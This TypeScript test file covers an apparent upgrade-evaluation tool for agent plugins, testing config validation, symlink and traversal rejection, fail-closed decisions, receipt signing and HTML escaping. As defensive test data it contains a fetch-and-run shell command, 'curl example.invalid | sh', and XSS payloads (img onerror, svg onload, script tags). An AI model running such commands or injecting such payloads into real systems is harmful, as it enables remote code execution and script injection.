import { test, type TestContext } from "node:test";
import assert from "node:assert/strict";
import { createHash, generateKeyPairSync } from "node:crypto";
import {
  chmodSync,
  mkdirSync,
  mkdtempSync,
  symlinkSync,
  writeFileSync,
} from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import {
  PUBLIC_ENTRY_SCHEMA,
  UPGRADE_CONFIG_SCHEMA,
  loadUpgradeConfig,
  validateCanaryDocument,
  validateUpgradeConfig,
  type UpgradeCanaryConfig,
  type UpgradeComponentConfig,
} from "../src/upgrade/contracts.ts";
import {
  aggregateTrials,
  compareCanary,
  decideUpgrade,
  inspectTarget,
  type CanaryComparison,
  type TargetSnapshot,
} from "../src/upgrade/decision.ts";
import {
  createPublicCompatibilityEntry,
  recomputeUpgradeReceiptHash,
  renderBreakageIndex,
  runUpgradeEvaluation,
  validatePublicCompatibilityEntry,
  verifyPublicCompatibilityEntry,
  type PublicCompatibilityEntry,
  type UpgradePrivateReceipt,
} from "../src/upgrade/receipt.ts";
import type { CanaryTrial, ContainmentProbe } from "../src/upgrade/sandbox.ts";

const IMAGE_DIGEST = `ghcr.io/example/upgrade-runner:20@sha256:${"a".repeat(64)}`;

function temp(prefix = "vigil-upgrade-"): string {
  return mkdtempSync(join(tmpdir(), prefix));
}

function sha256(value: string): string {
  return `sha256:${createHash("sha256").update(value).digest("hex")}`;
}

function validConfigInput(): Record<string, unknown> {
  return {
    schemaVersion: UPGRADE_CONFIG_SCHEMA,
    component: {
      ecosystem: "agent-plugin",
      name: "fixture-agent",
      manifestPath: "package.json",
      identityField: "name",
      versionField: "version",
      capabilityFields: ["agent.tools", "agent.permissions"],
    },
    runner: {
      engine: "docker",
      image: IMAGE_DIGEST,
      trials: 2,
      memoryMiB: 256,
      cpus: 0.5,
      pids: 64,
    },
    canaryDirectory: "test/upgrade-canaries",
    canaries: [{
      id: "tool-contract",
      publicId: "tool-contract-v1",
      command: ["node", "tool-contract.cjs"],
      timeoutSeconds: 10,
    }],
  };
}

function cloneConfig(): Record<string, any> {
  return structuredClone(validConfigInput());
}

function symlinkOrSkip(
  context: TestContext,
  target: string,
  path: string,
  type: "file" | "dir" | "junction",
): boolean {
  try {
    symlinkSync(target, path, type);
    return true;
  } catch (error) {
    const code = (error as NodeJS.ErrnoException).code;
    if (code === "EPERM" || code === "EACCES" || code === "UNKNOWN") {
      context.skip(`host does not permit ${type} creation (${code})`);
      return false;
    }
    throw error;
  }
}

test("upgrade config is exact at every object boundary", () => {
  assert.doesNotThrow(() => validateUpgradeConfig(validConfigInput()));

  const root = cloneConfig();
  root.unreviewedPolicy = true;
  assert.throws(() => validateUpgradeConfig(root), /upgrade config contains unknown field\(s\): unreviewedPolicy/);

  const component = cloneConfig();
  component.component.installScript = "curl example.invalid | sh";
  assert.throws(() => validateUpgradeConfig(component), /component contains unknown field\(s\): installScript/);

  const runner = cloneConfig();
  runner.runner.environment = { TOKEN: "secret" };
  assert.throws(() => validateUpgradeConfig(runner), /runner contains unknown field\(s\): environment/);

  const canary = cloneConfig();
  canary.canaries[0].shell = true;
  assert.throws(() => validateUpgradeConfig(canary), /canaries\[0\] contains unknown field\(s\): shell/);
});

test("upgrade config rejects traversal, platform-specific absolute paths, and mutable image tags", () => {
  for (const [field, value] of [
    ["manifestPath", "../outside/package.json"],
    ["manifestPath", "nested/../../outside.json"],
    ["manifestPath", "C:\\outside\\package.json"],
    ["canaryDirectory", "canaries/../../outside"],
    ["canaryDirectory", "/private/canaries"],
  ] as const) {
    const input = cloneConfig();
    if (field === "manifestPath") input.component.manifestPath = value;
    else input.canaryDirectory = value;
    assert.throws(
      () => validateUpgradeConfig(input),
      /must (?:remain inside the selected repository|be a portable repository-relative path)/,
      `${field} accepted ${value}`,
    );
  }

  const tagOnly = cloneConfig();
  tagOnly.runner.image = "node:20";
  assert.throws(() => validateUpgradeConfig(tagOnly), /runner\.image has an unsupported value/);

  const floatingLatest = cloneConfig();
  floatingLatest.runner.image = "node:latest";
  assert.throws(() => validateUpgradeConfig(floatingLatest), /runner\.image has an unsupported value/);

  const pinnedTag = cloneConfig();
  pinnedTag.runner.image = `node:20@sha256:${"b".repeat(64)}`;
  assert.equal(validateUpgradeConfig(pinnedTag).runner.image, pinnedTag.runner.image);
});

test("upgrade config files cannot be symbolic links", (context) => {
  const directory = temp("vigil-upgrade-config-link-");
  const realConfig = join(directory, "real-config.json");
  const linkedConfig = join(directory, "upgrade.json");
  writeFileSync(realConfig, JSON.stringify(validConfigInput()));
  if (!symlinkOrSkip(context, realConfig, linkedConfig, "file")) return;
  assert.throws(() => loadUpgradeConfig(linkedConfig), /regular non-symbolic-link file/);
});

test("upgrade config files cannot be reached through a symbolic-link parent", (context) => {
  const directory = temp("vigil-upgrade-config-parent-link-");
  const repository = join(directory, "repository");
  const outside = join(directory, "outside");
  mkdirSync(repository);
  mkdirSync(outside);
  writeFileSync(join(outside, "config.json"), JSON.stringify(validConfigInput()));
  const linkType = process.platform === "win32" ? "junction" : "dir";
  if (!symlinkOrSkip(context, outside, join(repository, "linked"), linkType)) return;
  assert.throws(() => runUpgradeEvaluation({
    configPath: join(repository, "linked", "config.json"),
    repository,
    currentDirectory: join(repository, "current"),
    candidateDirectory: join(repository, "candidate"),
  }), /upgrade config and its parents.*symbolic links/i);
});

test("canary output requires at least one bounded observation", () => {
  assert.throws(() => validateCanaryDocument({
    schemaVersion: "agent-vigil-upgrade-canary/v1",
    outcome: "PASS",
    observations: {},
  }), /at least one field/);
  const comparison = compared(
    [trial("empty", "PASS", 0), trial("empty", "PASS", 0)],
    [trial("empty", "PASS", 0), trial("empty", "PASS", 0)],
  );
  assert.equal(comparison.comparable, false);
  assert.equal(comparison.current.state, "HOLD");
});

function component(): UpgradeComponentConfig {
  return {
    ecosystem: "agent-plugin",
    name: "fixture-agent",
    manifestPath: "package.json",
    identityField: "name",
    versionField: "version",
    capabilityFields: ["tools"],
  };
}

function writeTarget(directory: string, version = "1.0.0"): void {
  mkdirSync(directory, { recursive: true });
  writeFileSync(join(directory, "package.json"), JSON.stringify({
    name: "fixture-agent",
    version,
    tools: ["read"],
  }));
  writeFileSync(join(directory, "implementation.txt"), "bounded fixture\n");
}

test("target inspection rejects a symbolic-link manifest", (context) => {
  const directory = temp("vigil-upgrade-manifest-link-");
  const target = join(directory, "target");
  const outside = join(directory, "outside.json");
  mkdirSync(target);
  writeFileSync(outside, JSON.stringify({ name: "fixture-agent", version: "1.0.0", tools: [] }));
  if (!symlinkOrSkip(context, outside, join(target, "package.json"), "file")) return;
  assert.throws(() => inspectTarget(target, component()), /manifest must be a regular non-symbolic-link file/);
});

test("target inspection rejects any nested symbolic link", (context) => {
  const directory = temp("vigil-upgrade-tree-link-");
  const target = join(directory, "target");
  const outside = join(directory, "outside.txt");
  writeTarget(target);
  writeFileSync(outside, "private material\n");
  if (!symlinkOrSkip(context, outside, join(target, "linked-private.txt"), "file")) return;
  assert.throws(() => inspectTarget(target, component()), /target contains a symbolic link: linked-private\.txt/);
});

test("target inspection rejects a symbolic-link target root", (context) => {
  const directory = temp("vigil-upgrade-root-link-");
  const realTarget = join(directory, "real-target");
  const linkedTarget = join(directory, "linked-target");
  writeTarget(realTarget);
  const linkType = process.platform === "win32" ? "junction" : "dir";
  if (!symlinkOrSkip(context, realTarget, linkedTarget, linkType)) return;
  assert.throws(
    () => inspectTarget(linkedTarget, component()),
    /symbolic link|symlink/i,
  );
});

test("capability evidence distinguishes an absent field from explicit null", () => {
  const directory = temp("vigil-upgrade-capability-presence-");
  const currentDirectory = join(directory, "current");
  const candidateDirectory = join(directory, "candidate");
  mkdirSync(currentDirectory);
  mkdirSync(candidateDirectory);
  writeFileSync(join(currentDirectory, "package.json"), JSON.stringify({ name: "fixture-agent", version: "1.0.0" }));
  writeFileSync(join(candidateDirectory, "package.json"), JSON.stringify({ name: "fixture-agent", version: "1.1.0", permissions: null }));
  const configured = { ...component(), capabilityFields: ["permissions"] };
  const current = inspectTarget(currentDirectory, configured);
  const candidate = inspectTarget(candidateDirectory, configured);
  assert.notEqual(current.capabilities[0].sha256, candidate.capabilities[0].sha256);
});

test("evaluation refuses a canary directory reached through a symbolic-link parent", (context) => {
  const directory = temp("vigil-upgrade-canary-link-");
  const repository = join(directory, "repository");
  const outside = join(directory, "outside");
  mkdirSync(repository);
  mkdirSync(outside);
  const linked = join(repository, "linked");
  const linkType = process.platform === "win32" ? "junction" : "dir";
  if (!symlinkOrSkip(context, outside, linked, linkType)) return;
  const input = cloneConfig();
  input.canaryDirectory = "linked";
  const configPath = join(repository, "config.json");
  writeFileSync(configPath, JSON.stringify(input));
  const receipt = runUpgradeEvaluation({
    configPath,
    repository,
    currentDirectory: join(repository, "missing-current"),
    candidateDirectory: join(repository, "missing-candidate"),
    dockerBin: "missing-docker-binary",
    generatedAt: "2026-08-22T12:00:00.000Z",
    nonce: "canary-symlink-test-nonce",
  });
  assert.equal(receipt.summary.verdict, "HOLD");
  assert.match(receipt.summary.reasons[0], /canary directory could not be trusted.*symbolic links/i);
});

test("evaluation refuses overlapping current, candidate, and canary roots", () => {
  const repository = temp("vigil-upgrade-overlap-");
  const current = join(repository, "current");
  const candidate = join(current, "candidate");
  const canaries = join(repository, "canaries");
  mkdirSync(current);
  mkdirSync(candidate);
  mkdirSync(canaries);
  const input = cloneConfig();
  input.canaryDirectory = "canaries";
  const configPath = join(repository, "config.json");
  writeFileSync(configPath, JSON.stringify(input));
  const receipt = runUpgradeEvaluation({
    configPath,
    repository,
    currentDirectory: current,
    candidateDirectory: candidate,
    dockerBin: "missing-docker-binary",
    generatedAt: "2026-08-22T12:00:00.000Z",
    nonce: "overlapping-roots-test-nonce",
  });
  assert.equal(receipt.summary.verdict, "HOLD");
  assert.match(receipt.summary.reasons[0], /separate, non-overlapping directories/);
});

test("evaluation becomes HOLD when an artifact or canary harness changes during trials", () => {
  const repository = temp("vigil-upgrade-moving-input-");
  const current = join(repository, "current");
  const candidate = join(repository, "candidate");
  const canaries = join(repository, "canaries");
  writeTarget(current, "1.0.0");
  writeTarget(candidate, "1.1.0");
  mkdirSync(canaries);
  const canaryFile = join(canaries, "tool-contract.cjs");
  writeFileSync(canaryFile, "// trusted canary v1\n");
  const input = cloneConfig();
  input.canaryDirectory = "canaries";
  input.canaries[0].command = ["node", "/canaries/tool-contract.cjs"];
  const configPath = join(repository, "config.json");
  writeFileSync(configPath, JSON.stringify(input));

  const fakeDocker = join(repository, "fake-docker.mjs");
  const image = String(input.runner.image);
  writeFileSync(fakeDocker, `#!/usr/bin/env node
import { existsSync, writeFileSync } from "node:fs";
const rawArgs = process.argv.slice(2);
const args = rawArgs[0] === "--host" ? rawArgs.slice(2) : rawArgs;
if (args[0] === "context" && args[1] === "inspect") {
  process.stdout.write(JSON.stringify("unix:///var/run/docker.sock"));
} else if (args[0] === "image") {
  process.stdout.write(JSON.stringify([${JSON.stringify(image)}]));
} else if (args[0] === "container" && args[1] === "ls") {
  process.stdout.write("");
} else if (args[0] === "container" && args[1] === "rm") {
  process.exitCode = 0;
} else if (args.includes("-e")) {
  process.stdout.write(JSON.stringify({networkBlocked:true,targetReadOnly:true,rootReadOnly:true,inheritedSecretAbsent:true,proxiesCleared:true}));
} else {
  const marker = ${JSON.stringify(join(repository, "mutated"))};
  if (!existsSync(marker)) {
    writeFileSync(marker, "1");
    writeFileSync(${JSON.stringify(canaryFile)}, "// trusted canary changed during evaluation\\n");
  }
  process.stdout.write(JSON.stringify({schemaVersion:"agent-vigil-upgrade-canary/v1",outcome:"PASS",observations:{stable:true}}));
}
`);
  chmodSync(fakeDocker, 0o755);

  const receipt = runUpgradeEvaluation({
    configPath,
    repository,
    currentDirectory: current,
    candidateDirectory: candidate,
    dockerBin: fakeDocker,
    generatedAt: "2026-08-22T12:00:00.000Z",
    nonce: "moving-input-test-nonce",
  });
  assert.equal(receipt.summary.verdict, "HOLD");
  assert.match(receipt.summary.reasons[0], /canary harness changed while the evaluation was running/);
});

function snapshot(overrides: Partial<TargetSnapshot> = {}): TargetSnapshot {
  return {
    ecosystem: "agent-plugin",
    name: "fixture-agent",
    version: "1.0.0",
    treeSha256: sha256("tree-current"),
    manifestSha256: sha256("manifest-current"),
    fileCount: 2,
    totalBytes: 128,
    capabilities: [{ field: "tools", count: 1, sha256: sha256("read") }],
    ...overrides,
  };
}

const PASS_CONTAINMENT: ContainmentProbe = {
  status: "PASS",
  localEndpoint: true,
  imagePresent: true,
  networkBlocked: true,
  targetReadOnly: true,
  rootReadOnly: true,
  inheritedSecretAbsent: true,
  proxiesCleared: true,
  reason: "all controls held",
};

const HOLD_CONTAINMENT: ContainmentProbe = {
  status: "HOLD",
  localEndpoint: false,
  imagePresent: false,
  networkBlocked: false,
  targetReadOnly: false,
  rootReadOnly: false,
  inheritedSecretAbsent: false,
  proxiesCleared: false,
  reason: "containment unavailable",
};

const CANARY: UpgradeCanaryConfig = {
  id: "tool-contract",
  publicId: "tool-contract-v1",
  command: ["node", "tool-contract.cjs"],
  timeoutSeconds: 10,
};

function trial(
  observation: string,
  state: CanaryTrial["state"] = "PASS",
  observationCount = 1,
): CanaryTrial {
  return {
    state,
    ...(state === "HOLD" ? {} : { observationSha256: sha256(observation), observationCount }),
    reason: state === "HOLD" ? "trial incomplete" : "bounded fixture",
  };
}

function compared(
  current = [trial("same"), trial("same")],
  candidate = [trial("same"), trial("same")],
): CanaryComparison {
  return compareCanary(CANARY, sha256("node tool-contract.cjs"), current, candidate);
}

test("pure decision returns SAFE only for distinct artifacts with stable comparable evidence", () => {
  const current = snapshot();
  const candidate = snapshot({
    version: "1.1.0",
    treeSha256: sha256("tree-candidate"),
    manifestSha256: sha256("manifest-candidate"),
  });
  const decision = decideUpgrade(PASS_CONTAINMENT, current, candidate, [compared()]);
  assert.equal(decision.verdict, "SAFE");
  assert.deepEqual(decision.reasons, ["no material change was detected by these exact canaries under the recorded contained runner"]);
  assert.equal(decision.capabilities[0].changed, false);
  assert.equal(decision.canaries[0].changed, false);
});

test("pure decision returns CHANGED for a capability or stable canary delta", () => {
  const current = snapshot();
  const capabilityCandidate = snapshot({
    version: "1.1.0",
    treeSha256: sha256("tree-capability-change"),
    capabilities: [{ field: "tools", count: 2, sha256: sha256("read-write") }],
  });
  const capabilityDecision = decideUpgrade(PASS_CONTAINMENT, current, capabilityCandidate, [compared()]);
  assert.equal(capabilityDecision.verdict, "CHANGED");
  assert.equal(capabilityDecision.capabilities[0].changed, true);

  const behaviorCandidate = snapshot({ version: "1.1.0", treeSha256: sha256("tree-behavior-change") });
  const behaviorDecision = decideUpgrade(
    PASS_CONTAINMENT,
    current,
    behaviorCandidate,
    [compared(undefined, [trial("different"), trial("different")])],
  );
  assert.equal(behaviorDecision.verdict, "CHANGED");
  assert.equal(behaviorDecision.canaries[0].changed, true);
});

test("pure decision fails closed to HOLD for containment, identity, artifact, or evidence gaps", () => {
  const current = snapshot();
  const candidate = snapshot({ version: "1.1.0", treeSha256: sha256("tree-candidate") });

  assert.equal(decideUpgrade(HOLD_CONTAINMENT, current, candidate, [compared()]).verdict, "HOLD");
  assert.equal(decideUpgrade({ ...PASS_CONTAINMENT, localEndpoint: false }, current, candidate, [compared()]).verdict, "HOLD");
  assert.equal(decideUpgrade(PASS_CONTAINMENT, current, { ...candidate, name: "other-agent" }, [compared()]).verdict, "HOLD");
  assert.equal(decideUpgrade(PASS_CONTAINMENT, current, { ...candidate, version: current.version }, [compared()]).verdict, "HOLD");
  assert.equal(decideUpgrade(PASS_CONTAINMENT, current, { ...candidate, treeSha256: current.treeSha256 }, [compared()]).verdict, "HOLD");
  assert.equal(decideUpgrade(PASS_CONTAINMENT, current, candidate, [compared([], [])]).verdict, "HOLD");
  assert.equal(decideUpgrade(PASS_CONTAINMENT, current, candidate, []).verdict, "HOLD");
});

test("nondeterministic repeated trials can never become comparable or SAFE", () => {
  const stateDrift = aggregateTrials([trial("same"), trial("same", "FAIL")]);
  assert.equal(stateDrift.state, "HOLD");
  assert.equal(stateDrift.stable, false);
  assert.match(stateDrift.reason, /nondeterministic evidence/);

  const observationDrift = aggregateTrials([trial("first"), trial("second")]);
  assert.equal(observationDrift.state, "HOLD");
  assert.equal(observationDrift.stable, false);

  const countDrift = aggregateTrials([trial("same", "PASS", 1), trial("same", "PASS", 2)]);
  assert.equal(countDrift.state, "HOLD");

  const comparison = compared(
    [trial("baseline"), trial("baseline")],
    [trial("candidate-a"), trial("candidate-b")],
  );
  assert.equal(comparison.candidate.state, "HOLD");
  assert.equal(comparison.comparable, false);
  assert.equal(comparison.changed, false);

  const decision = decideUpgrade(
    PASS_CONTAINMENT,
    snapshot(),
    snapshot({ version: "1.1.0", treeSha256: sha256("tree-candidate") }),
    [comparison],
  );
  assert.equal(decision.verdict, "HOLD");
});

function privateReceipt(): UpgradePrivateReceipt {
  const current = snapshot();
  const candidate = snapshot({
    version: "1.1.0",
    treeSha256: sha256("tree-public-candidate"),
    manifestSha256: sha256("manifest-public-candidate"),
    capabilities: [{ field: "tools", count: 2, sha256: sha256("read-write") }],
  });
  const receipt: UpgradePrivateReceipt = {
    schemaVersion: "agent-vigil-upgrade-receipt/v1",
    vigilVersion: "0.12.0-test",
    generatedAt: "2026-08-22T12:00:00.000Z",
    nonce: "PRIVATE-NONCE-DO-NOT-PUBLISH",
    component: { ecosystem: "agent-plugin", name: "fixture-agent" },
    configSha256: sha256("PRIVATE-CONFIG-DO-NOT-PUBLISH"),
    runner: {
      engine: "docker",
      image: IMAGE_DIGEST,
      trials: 2,
      network: "none",
      filesystem: "read-only",
      environment: "explicit",
    },
    containment: { ...PASS_CONTAINMENT, reason: "PRIVATE-CONTAINMENT-DETAIL-DO-NOT-PUBLISH" },
    current,
    candidate,
    canaryHarness: {
      treeSha256: sha256("PRIVATE-CANARY-HARNESS-DO-NOT-PUBLISH"),
      fileCount: 1,
      totalBytes: 128,
    },
    capabilities: [
      { field: "agent.tools", currentCount: 1, candidateCount: 2, changed: true },
      { field: "private.promptTemplate", currentCount: 1, candidateCount: 1, changed: true },
    ],
    canaries: [{
      id: "private-canary-id-do-not-publish",
      publicId: "published-tool-contract",
      idSha256: sha256("private-canary-id-do-not-publish"),
      commandSha256: sha256("PRIVATE-COMMAND-DO-NOT-PUBLISH"),
      current: aggregateTrials([trial("PRIVATE-OBSERVATION-CURRENT"), trial("PRIVATE-OBSERVATION-CURRENT")]),
      candidate: aggregateTrials([trial("PRIVATE-OBSERVATION-CANDIDATE"), trial("PRIVATE-OBSERVATION-CANDIDATE")]),
      changed: true,
      comparable: true,
    }],
    summary: {
      verdict: "CHANGED",
      reasons: ["PRIVATE-REASON-DO-NOT-PUBLISH"],
      comparedCanaries: 1,
      changedCanaries: 1,
      changedCapabilities: 2,
    },
    limitations: ["Bounded to the exact artifacts and canaries in the private receipt."],
    receiptHash: "",
  };
  receipt.receiptHash = recomputeUpgradeReceiptHash(receipt);
  return receipt;
}

function signingFixture(): {
  privateKeyPath: string;
  publicKeyPath: string;
  wrongPublicKeyPath: string;
} {
  const directory = temp("vigil-upgrade-signing-");
  const privateKeyPath = join(directory, "private.pem");
  const publicKeyPath = join(directory, "public.pem");
  const wrongPublicKeyPath = join(directory, "wrong-public.pem");
  const pair = generateKeyPairSync("ed25519");
  const wrong = generateKeyPairSync("ed25519");
  writeFileSync(privateKeyPath, pair.privateKey.export({ type: "pkcs8", format: "pem" }));
  writeFileSync(publicKeyPath, pair.publicKey.export({ type: "spki", format: "pem" }));
  writeFileSync(wrongPublicKeyPath, wrong.publicKey.export({ type: "spki", format: "pem" }));
  return { privateKeyPath, publicKeyPath, wrongPublicKeyPath };
}

function signedPublicEntry(): {
  receipt: UpgradePrivateReceipt;
  entry: PublicCompatibilityEntry;
  publicKeyPath: string;
  wrongPublicKeyPath: string;
} {
  const receipt = privateReceipt();
  const keys = signingFixture();
  return {
    receipt,
    entry: createPublicCompatibilityEntry(receipt, keys.privateKeyPath),
    publicKeyPath: keys.publicKeyPath,
    wrongPublicKeyPath: keys.wrongPublicKeyPath,
  };
}

test("public compatibility entries validate, verify, and require the pinned publisher key", () => {
  const { entry, publicKeyPath, wrongPublicKeyPath } = signedPublicEntry();
  assert.equal(entry.schemaVersion, PUBLIC_ENTRY_SCHEMA);
  assert.deepEqual(validatePublicCompatibilityEntry(entry), entry);

  const embedded = verifyPublicCompatibilityEntry(entry);
  assert.equal(embedded.hashValid, true);
  assert.equal(embedded.signatureValid, true);
  assert.equal(embedded.keyPinned, false);

  const pinned = verifyPublicCompatibilityEntry(entry, publicKeyPath);
  assert.equal(pinned.hashValid, true);
  assert.equal(pinned.signatureValid, true);
  assert.equal(pinned.keyPinned, true);

  const contradictoryEmbeddedKey = structuredClone(entry);
  const replacement = generateKeyPairSync("ed25519").publicKey.export({ type: "spki", format: "der" });
  contradictoryEmbeddedKey.signature.publicKey = replacement.toString("base64");
  const contradictory = verifyPublicCompatibilityEntry(contradictoryEmbeddedKey, publicKeyPath);
  assert.equal(contradictory.hashValid, true);
  assert.equal(contradictory.signatureValid, false);

  const wrongPublisher = verifyPublicCompatibilityEntry(entry, wrongPublicKeyPath);
  assert.equal(wrongPublisher.hashValid, true);
  assert.equal(wrongPublisher.signatureValid, false);
  assert.equal(wrongPublisher.keyPinned, true);

  assert.throws(
    () => validatePublicCompatibilityEntry({ ...entry, surprise: "unsigned field" }),
    /public compatibility entry contains unknown field\(s\): surprise/,
  );
});

test("public and private receipt tampering cannot produce a fully valid result", () => {
  const { receipt, entry, publicKeyPath } = signedPublicEntry();

  const payloadTamper = structuredClone(entry);
  payloadTamper.component.candidateVersion = "9.9.9-tampered";
  const payloadResult = verifyPublicCompatibilityEntry(payloadTamper, publicKeyPath);
  assert.equal(payloadResult.hashValid, false);
  assert.equal(payloadResult.hashValid && payloadResult.signatureValid, false);

  const signatureTamper = structuredClone(entry);
  signatureTamper.signature.value = Buffer.alloc(64).toString("base64");
  const signatureResult = verifyPublicCompatibilityEntry(signatureTamper, publicKeyPath);
  assert.equal(signatureResult.hashValid, true);
  assert.equal(signatureResult.signatureValid, false);

  const privateTamper = structuredClone(receipt);
  privateTamper.summary.verdict = "SAFE";
  const { privateKeyPath } = signingFixture();
  assert.throws(
    () => createPublicCompatibilityEntry(privateTamper, privateKeyPath),
    /private upgrade receipt hash is invalid/,
  );
});

test("public compatibility entries minimize private receipt data", () => {
  const { entry } = signedPublicEntry();
  const published = JSON.stringify(entry);
  assert.match(published, /published-tool-contract/);
  assert.deepEqual(entry.changedCapabilities, ["other", "tools"]);
  assert.equal(entry.runner.configSha256, sha256("PRIVATE-CONFIG-DO-NOT-PUBLISH"));
  assert.equal(entry.runner.canaryHarnessSha256, sha256("PRIVATE-CANARY-HARNESS-DO-NOT-PUBLISH"));

  for (const secret of [
    "PRIVATE-NONCE-DO-NOT-PUBLISH",
    "PRIVATE-CONTAINMENT-DETAIL-DO-NOT-PUBLISH",
    "private-canary-id-do-not-publish",
    "PRIVATE-COMMAND-DO-NOT-PUBLISH",
    "PRIVATE-OBSERVATION-CURRENT",
    "PRIVATE-OBSERVATION-CANDIDATE",
    "PRIVATE-REASON-DO-NOT-PUBLISH",
    "private.promptTemplate",
  ]) {
    assert.equal(published.includes(secret), false, `public entry leaked ${secret}`);
  }
  for (const privateField of ["nonce", "commandSha256", "observationSha256", "reason"]) {
    assert.equal(published.includes(`\"${privateField}\"`), false, `public entry retained ${privateField}`);
  }
});

test("Breakage Index escapes entry-controlled text and ships a deny-by-default CSP", () => {
  const { entry } = signedPublicEntry();
  const hostile = structuredClone(entry);
  hostile.component.name = `\"><img src=x onerror="globalThis.pwned=1">`;
  hostile.component.ecosystem = "<script>globalThis.pwned=2</script>";
  hostile.component.currentVersion = "1.0.0</td><script>pwned()</script>";
  hostile.component.candidateVersion = "2.0.0 & beyond";
  hostile.changedCapabilities = [`tools</td><img src=x onerror="pwned()">`];
  hostile.entryHash = `<svg/onload="pwned()">${hostile.entryHash}`;

  const page = renderBreakageIndex([hostile]);
  assert.match(page, /http-equiv="Content-Security-Policy"/);
  assert.match(page, /default-src 'none'/);
  assert.match(page, /base-uri 'none'/);
  assert.match(page, /form-action 'none'/);
  assert.match(page, /style-src 'unsafe-inline'/);
  assert.doesNotMatch(page, /<script[\s>]/i);
  assert.doesNotMatch(page, /<img[\s>]/i);
  assert.doesNotMatch(page, /<svg[\s/>]/i);
  assert.match(page, /&quot;&gt;&lt;img src=x onerror=&quot;globalThis\.pwned=1&quot;&gt;/);
  assert.match(page, /&lt;script&gt;globalThis\.pwned=2&lt;\/script&gt;/);
  assert.match(page, /2\.0\.0 &amp; beyond/);
  assert.match(page, /&lt;svg\/onload=&quot;pwned\(\)&quot;&gt;/);
});
